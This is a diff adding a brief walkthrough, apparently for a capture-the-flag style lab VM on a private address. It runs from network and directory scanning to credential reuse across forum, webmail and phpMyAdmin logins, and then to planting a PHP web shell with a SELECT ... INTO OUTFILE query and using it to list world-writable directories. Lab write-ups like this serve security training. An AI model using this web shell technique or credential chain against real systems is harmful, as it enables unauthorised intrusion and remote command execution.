@@ -1,0 +1,30 @@
+nmap 192.168.0.0/16
+dirb  https://192.168.0.140
+https://192.168.0.140/forum/
+go to topick "Problem login"
+find login lmezard
+password !q\]Ej?*5K5cy*AJ
+push login
+go to user profile and find email laurie@borntosec.net
+go to https://192.168.0.140/webmail/ with login laurie@borntosec.net and password !q\]Ej?*5K5cy*AJ
+go to https://192.168.0.140/phpmyadmin/ with login root and password Fg-'kKXBj87E:aJ$
+go to SQL and use command:
+	SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/cmd.php" 
+go to https://192.168.0.140/forum/templates_c/
+run command:
+	https://192.168.0.140/forum/templates_c/cmd.php?cmd=find%20%20/%20-maxdepth%203%20-type%20d%20-perm%20-777%202%3E/dev/null
+it find folders with all permissions
+out:
+	/run/shm
+	/run/lock
+	/tmp
+	/tmp/.ICE-unix
+	/tmp/.X11-unix
+	/var/crash
+	/var/tmp
+	/rofs
+	/rofs/tmp
+	/rofs/var/crash
+	/rofs/var/tmp 
+	
+
